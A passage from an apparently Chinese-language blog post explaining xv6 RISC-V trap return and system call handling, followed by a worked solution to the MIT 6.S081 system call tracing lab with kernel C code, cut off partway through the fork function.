title="返回到U-mode"></a>返回到U-mode</h3><p>同样是前面<strong>汇编形式的向量代码</strong>的反向操作，包括切换为<strong>用户页表</strong>和切换到<strong>用户栈</strong></p><p>其中从前面的<strong>usertrapret</strong>返回时，其将<strong>trapframe</strong>在<strong>U-mode</strong>地址空间的虚拟地址和<strong>U-mode</strong>的页表作为参数传入，则恢复起来要相当容易，即首先切换到<strong>U-mode</strong>页表，然后依次从<strong>trapframe</strong>中恢复上下文和<strong>sscratch</strong>(Supervisior Scratch)(kernel/trampoline.S:88)</p><h2 id="硬件处理2"><a href="#硬件处理2" class="headerlink" title="硬件处理2"></a>硬件处理2</h2><p>终于到最后一步，执行<strong>sret</strong>指令</p><p>其同样是前面硬件处理的逆操作</p><p>RISC-V架构的硬件会执行如下步骤</p><ol><li>将<strong>sepc</strong>(Supervisor Exception Program Counter)复制到<strong>pc</strong>寄存器</li><li>将特权级从<strong>sstatus</strong>(Supervisor Status Register)的<strong>SPP</strong>(Supervisor Previous Privilege)比特恢复</li><li>开始执行新的<strong>pc</strong>寄存器的执行流</li></ol><h1 id="xv6的系统调用"><a href="#xv6的系统调用" class="headerlink" title="xv6的系统调用"></a>xv6的系统调用</h1><p>前面也分析过了，系统调用是<strong>trap</strong>的一种，其在<strong>usertrap</strong>(kernel/trap.c:67)调用<strong>syscall</strong>处理(kernel/syscall.c:132)</p><p>riscv和其他架构的<strong>syscall</strong>处理方法相似，将系统调用整理成函数指针数组(kernel/syscall.c:108)，将<strong>系统调用号</strong>作为下标即可</p><p>其系统调用号通过<strong>a7</strong>寄存器传递(kernel/syscall.c:138)，返回值通过<strong>a0</strong>寄存器传递(kernel/syscall.c:140)，也就是通过访问<strong>trapframe</strong>上相关数据即可实现</p><p>这里需要特别说明的是系统调用的参数，尤其是指针类型的参数——因为<strong>S-mode</strong>和<strong>U-mode</strong>使用的页表不一样，其<strong>trapframe</strong>传递的引用类型的参数需要特别处理，也就是将<strong>U-mode</strong>地址空间中虚拟地址对应的物理地址映射入<strong>S-mode</strong>中，再进行访问(kernel/vm.c:379)</p><h1 id="Lab-system-calls"><a href="#Lab-system-calls" class="headerlink" title="Lab system calls"></a>Lab system calls</h1><p>本次<a href="https://pdos.csail.mit.edu/6.828/2020/labs/syscall.html">lab</a>帮助熟悉<strong>xv6</strong>的系统调用的实现</p><h2 id="system-call-tracing"><a href="#system-call-tracing" class="headerlink" title="system call tracing"></a>system call tracing</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><blockquote><p>In this assignment you will add a system call tracing feature that may help you when debugging later labs. You’ll create a new <strong>trace</strong> system call that will control tracing. It should take one argument, an integer “mask”, whose bits specify which system calls to trace. For example, to trace the fork system call, a program calls <strong>trace(1 &lt;&lt; SYS_fork)</strong>, where SYS_fork is a syscall number from <strong>kernel/syscall.h</strong>. You have to modify the xv6 kernel to print out a line when each system call is about to return, if the system call’s number is set in the mask. The line should contain the process id, the name of the system call and the return value; you don’t need to print the system call arguments. The <strong>trace</strong> system call should enable tracing for the process that calls it and any children that it subsequently forks, but should not affect other processes. </p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>根据前面的分析，内核函数的服务例程调用位于<strong>syscall</strong>(kernel/syscall.c:172)<br>因此只需要在调用结束后，输出相关的调用信息即可</p><p>而判断当前进程是否被<strong>trace</strong>，以及<strong>trace</strong>了那些系统调用，可以通过在<strong>struct proc</strong>添加标志位集合字段即可。即在输出调用信息前，判断该系统调用对应的标志位是否被设置，从而决定是否输出调用信息</p><p>而实现<strong>trace</strong>系统调用则简单的多，即将传入的参数赋给当前进程的对应字段即可</p><p>需要特别说明的是，该字段的值应该可以进程，即<strong>fork</strong>的时候，子进程<strong>struct proc</strong>结构体的相关字段应该和父进程的对应字段一样，从而<strong>trace</strong>系统调用可以继续追踪进程的子进程</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>首先，在Makefile中添加测试目标，如下所示<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">UPROGS=\</span><br><span class="line">$U/_cat\</span><br><span class="line">$U/_echo\</span><br><span class="line">$U/_forktest\</span><br><span class="line">$U/_grep\</span><br><span class="line">$U/_init\</span><br><span class="line">$U/_kill\</span><br><span class="line">$U/_ln\</span><br><span class="line">$U/_ls\</span><br><span class="line">$U/_mkdir\</span><br><span class="line">$U/_rm\</span><br><span class="line">$U/_sh\</span><br><span class="line">$U/_stressfs\</span><br><span class="line">$U/_trace\</span><br><span class="line">$U/_usertests\</span><br><span class="line">$U/_grind\</span><br><span class="line">$U/_wc\</span><br><span class="line">$U/_zombie\</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>其次，添加<strong>trace</strong>系统调用的声明，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/syscall.h</span></span><br><span class="line"><span class="comment">// System call numbers</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_fork    1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_exit    2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_wait    3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_pipe    4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_read    5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_kill    6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_exec    7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_fstat   8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_chdir   9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_dup    10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_getpid 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_sbrk   12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_sleep  13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_uptime 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_open   15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_write  16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_mknod  17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_unlink 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_link   19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_mkdir  20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_close  21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_trace  22</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/syscall.c</span></span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_chdir</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_close</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_dup</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_exec</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_exit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_fstat</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_getpid</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_kill</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_link</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_mkdir</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_mknod</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_open</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_pipe</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_read</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_sbrk</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_sleep</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_unlink</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_wait</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_write</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_uptime</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_trace</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="type">void</span>)</span> = &#123;</span><br><span class="line">[SYS_fork]    sys_fork,</span><br><span class="line">[SYS_exit]    sys_exit,</span><br><span class="line">[SYS_wait]    sys_wait,</span><br><span class="line">[SYS_pipe]    sys_pipe,</span><br><span class="line">[SYS_read]    sys_read,</span><br><span class="line">[SYS_kill]    sys_kill,</span><br><span class="line">[SYS_exec]    sys_exec,</span><br><span class="line">[SYS_fstat]   sys_fstat,</span><br><span class="line">[SYS_chdir]   sys_chdir,</span><br><span class="line">[SYS_dup]     sys_dup,</span><br><span class="line">[SYS_getpid]  sys_getpid,</span><br><span class="line">[SYS_sbrk]    sys_sbrk,</span><br><span class="line">[SYS_sleep]   sys_sleep,</span><br><span class="line">[SYS_uptime]  sys_uptime,</span><br><span class="line">[SYS_open]    sys_open,</span><br><span class="line">[SYS_write]   sys_write,</span><br><span class="line">[SYS_mknod]   sys_mknod,</span><br><span class="line">[SYS_unlink]  sys_unlink,</span><br><span class="line">[SYS_link]    sys_link,</span><br><span class="line">[SYS_mkdir]   sys_mkdir,</span><br><span class="line">[SYS_close]   sys_close,</span><br><span class="line">[SYS_trace]   sys_trace,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *syscall_names[] = &#123;</span><br><span class="line">[SYS_fork]    <span class="string">&quot;fork&quot;</span>,</span><br><span class="line">[SYS_exit]    <span class="string">&quot;exit&quot;</span>,</span><br><span class="line">[SYS_wait]    <span class="string">&quot;wait&quot;</span>,</span><br><span class="line">[SYS_pipe]    <span class="string">&quot;pipe&quot;</span>,</span><br><span class="line">[SYS_read]    <span class="string">&quot;read&quot;</span>,</span><br><span class="line">[SYS_kill]    <span class="string">&quot;kill&quot;</span>,</span><br><span class="line">[SYS_exec]    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">[SYS_fstat]   <span class="string">&quot;fstat&quot;</span>,</span><br><span class="line">[SYS_chdir]   <span class="string">&quot;chdir&quot;</span>,</span><br><span class="line">[SYS_dup]     <span class="string">&quot;dup&quot;</span>,</span><br><span class="line">[SYS_getpid]  <span class="string">&quot;getpid&quot;</span>,</span><br><span class="line">[SYS_sbrk]    <span class="string">&quot;sbrk&quot;</span>,</span><br><span class="line">[SYS_sleep]   <span class="string">&quot;sleep&quot;</span>,</span><br><span class="line">[SYS_uptime]  <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">[SYS_open]    <span class="string">&quot;open&quot;</span>,</span><br><span class="line">[SYS_write]   <span class="string">&quot;write&quot;</span>,</span><br><span class="line">[SYS_mknod]   <span class="string">&quot;mknod&quot;</span>,</span><br><span class="line">[SYS_unlink]  <span class="string">&quot;unlink&quot;</span>,</span><br><span class="line">[SYS_link]    <span class="string">&quot;link&quot;</span>,</span><br><span class="line">[SYS_mkdir]   <span class="string">&quot;mkdir&quot;</span>,</span><br><span class="line">[SYS_close]   <span class="string">&quot;close&quot;</span>,</span><br><span class="line">[SYS_trace]   <span class="string">&quot;trace&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// user/user.h</span></span><br><span class="line"><span class="comment">// system calls</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span>)</span> __<span class="title function_">attribute__</span><span class="params">((<span class="keyword">noreturn</span>))</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">wait</span><span class="params">(<span class="type">int</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe</span><span class="params">(<span class="type">int</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span>, <span class="type">const</span> <span class="type">void</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span>, <span class="type">void</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">close</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">kill</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">exec</span><span class="params">(<span class="type">char</span>*, <span class="type">char</span>**)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">mknod</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">short</span>, <span class="type">short</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">unlink</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fstat</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> stat*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">link</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">mkdir</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">chdir</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dup</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getpid</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">char</span>* <span class="title function_">sbrk</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sleep</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">uptime</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">trace</span><span class="params">(<span class="type">int</span> mask)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// user/usys.pl</span></span><br><span class="line">entry(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;wait&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;close&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;kill&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;exec&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;mknod&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;unlink&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;fstat&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;link&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;mkdir&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;chdir&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;getpid&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;sbrk&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;sleep&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;uptime&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;trace&quot;</span>);</span><br></pre></td></tr></table></figure></p><p>最后，实现<strong>trace</strong>系统调用相关功能<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.h</span></span><br><span class="line"><span class="comment">// Per-process state</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// p-&gt;lock must be held when using these:</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">procstate</span> <span class="title">state</span>;</span>        <span class="comment">// Process state</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">parent</span>;</span>         <span class="comment">// Parent process</span></span><br><span class="line">  <span class="type">void</span> *chan;                  <span class="comment">// If non-zero, sleeping on chan</span></span><br><span class="line">  <span class="type">int</span> killed;                  <span class="comment">// If non-zero, have been killed</span></span><br><span class="line">  <span class="type">int</span> xstate;                  <span class="comment">// Exit status to be returned to parent&#x27;s wait</span></span><br><span class="line">  <span class="type">int</span> pid;                     <span class="comment">// Process ID</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// these are private to the process, so p-&gt;lock need not be held.</span></span><br><span class="line">  uint64 kstack;               <span class="comment">// Virtual address of kernel stack</span></span><br><span class="line">  uint64 sz;                   <span class="comment">// Size of process memory (bytes)</span></span><br><span class="line">  <span class="type">pagetable_t</span> pagetable;       <span class="comment">// User page table</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">trapframe</span>;</span> <span class="comment">// data page for trampoline.S</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>      <span class="comment">// swtch() here to run process</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">ofile</span>[<span class="title">NOFILE</span>];</span>  <span class="comment">// Open files</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">cwd</span>;</span>           <span class="comment">// Current directory</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">16</span>];               <span class="comment">// Process name (debugging)</span></span><br><span class="line">  <span class="type">int</span> trace_mask;              <span class="comment">// Process trace mask</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/sysproc.c</span></span><br><span class="line"><span class="comment">// mark current process as traced process</span></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_trace</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  <span class="type">int</span> mask;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argint(<span class="number">0</span>, &amp;mask) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  p-&gt;trace_mask |= mask;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line"><span class="comment">// Create a new process, copying the parent.</span></span><br><span class="line"><span class="comment">// Sets up child kernel stack to return as if from fork() system call.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i, pid;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">np</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate process.</span></span><br><span class="line">  <span class="keyword">if</span>((np = allocproc()) == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Copy user memory from parent to child.</span></span><br><span class="line">  <span class="keyword">if</span>(uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(np);</span><br><span class="line">    release(&amp;np-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  np-&gt;sz = p-&gt;sz;</span><br><span class="line"></span><br><span class="line">  np-&gt;parent = p;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// inherit parent trace_mask</span></span><br><span class="line">  np-&gt;trace_mask = p-&gt;trace_mask;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// copy saved user registers.</span></span><br><span class="line">  *(np-&gt;trapframe) = *(p-&gt;trapframe);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Cause fork to return 0 in the child.</span></span><br><span class="line">  np-&gt;trapframe-&gt;a0 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// increment reference counts on open file descriptors.</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NOFILE; i++)</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;ofile[i])</span><br><span class="line">      np-&gt;ofile[i] = filedup(p-&gt;ofile[i]);</span><br><span class="line">  np-&gt;cwd = idup(p-&gt;cwd);</span><br><span class="line"></span><br><span class="line">  safestrcpy(np-&gt;name, p-&gt;name, <span class="keyword">sizeof</span>(p-&gt;name));</span><br><span class="line"></span><br><span class="line">  pid = np-&gt;pid;</span><br><span class="line"></span><br><span class="line">  np-&gt;state = RUNNABLE;</span><br><span class="line"></span><br><span class="line">  